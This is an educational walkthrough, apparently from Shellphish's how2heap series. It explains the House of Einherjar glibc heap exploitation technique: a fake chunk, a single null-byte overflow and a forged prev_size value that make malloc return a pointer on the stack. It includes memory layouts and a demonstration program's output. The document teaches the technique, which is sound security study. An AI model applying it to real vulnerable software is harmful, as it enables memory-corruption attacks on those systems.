# Shellphish how2heap House of Einherjar

This is another section of the CTF team Shellphish's educational how2heap series. This section covers the House of Einherjar attack.

In order for this attack to work, the program must be compiled with the `tcache-option` option disabled for glibc. This attack will allow an attacker to get `malloc` to allocate a chunk of memory outside of the heap, however we need to know the address of where the fake chunk is, and we will need a single null byte overflow, and the abillity to overwrite the `previous_size` value for a heap chunk. 

## Exploitation Process

First we will allocate a single heap chunk `0x38` bytes large. This will be later used in our attack:

```
0:	0x38    :0x556a4b364010
```

Proceeding that we will create a fake chunk. This chunk will be located on the stack, however it can be located in the `bss`, `libc`, `heap` or anywhere that we can write to and know the address of:

```
0x0:	Previous Size:	0x100			:0x7fffbea426f0
0x8:	Chunk Size:		0x100
0x10:	fwd pointer
0x18:	bk pointer
0x20:	fwd size
0x28:	bk size
```

This chunk has five integers that we will need to write.  The first is the previous chunk pointer, which we have set to `0x100`. The next value is the chunk size value (the supposed size for our fake chunk) which we will also have set to `0x100` (however this will write over this value later). Proceeding that we will have the `fwd` and `bk` pointers (which are supposed to point to the next and previous free chunks) and the `fwd_size` and `bk_size` (supposed to be the corresponding sizes for the previous pointers). We will have the value for all of these bee the pointer to the fake chunk `0x7fffbea426f0`.

proceeding that we will now allocate another heap chunk `0xf8` bytes large:
```
0:	0x38	:0x556a4b364010
1:	0xf8	:0x556a4b364050
```

next we will execute an attack where we can write over the last byte of the size metadata for chunk `1` with a null byte `\x00` (this can be down with a null byte overflow). This will overwrite the `previous_chunk_in_use` bit, so the `malloc` will think that the previous chunk is free:

```
0:	0x38	:0x556a4b364010
1:	0xf8 previous_in_use bit = 0 with null byte overflow from chunk 0	:0x556a4b364050
```

For the next step, we will write a fake previous size to chunk `0`. The idea of this being that when we write the fake size to chunk `0`, we will then free chunk `1`. Since we overwrote the `previous_in_use_bit` to be `0x0`, when we free chunk `1` it will think that chunk `0` is also free. It will try to consolidate the chunk with the last chunk, which if we overflow the `previous_size` value for chunk `1` to be the difference between our fake chunk on the stack and chunk `1`, it will consolidate the chunk to the fake stack. Our fake chunk is at `0x7fffbea426f0`, and chunk `1` is at `0x556a4b364040` (when you factor in the `0x10` bytes of heap metadata) so the `previous_size` will be `0x556a4b364040 - 0x7fffbea426f0 = 0xffffd56a8c921950`:

```
0:	0x38 						:0x556a4b364010
1:	0xf8 previous_size overwritten to 0xffffd56a8c921950 & previous_in_use bit = 0 with null byte overflow from chunk 0			:0x556a4b364050
```

With that setup, we can now free chunk `1` and consolidate the heap to the fake chunk:

```
0:	0x38 (heap thinks this has been freed)			:0x556a4b364010
1:	0xf8 (freed)									:0x556a4b364050
```	

Now that the heap has consolidated to our fake chunk on the stack, we can just allocate another chunk, and we will get `malloc` to return a pointer to the stack (keep in mind, there is `0x10` bytes of heap metada):

```
0:	0x38 (heap thinks this has been freed)			:0x556a4b364010
1:	0xf8 (freed)									:0x556a4b364050
2:	0x200	Fake Chunk Allocated on Stack			:0x7fffbea42700
```

Just like that, we managed to allocate a fake chunk on the stack using a House of Einherjar attack!

## Code Running

Here is a copy of the code running:

```
$	./house_of_einherjar
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x556a4b364010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fffbea426f0 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffbea426f0
bck: 0x7fffbea426f0
fwd_nextsize: 0x7fffbea426f0
bck_nextsize: 0x7fffbea426f0

We allocate 0xf8 bytes for 'b'.
b: 0x556a4b364050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x556a4b364040 - 0x7fffbea426f0 = 0xffffd56a8c921950

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffffd56a8c942911 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fffbea42700
```
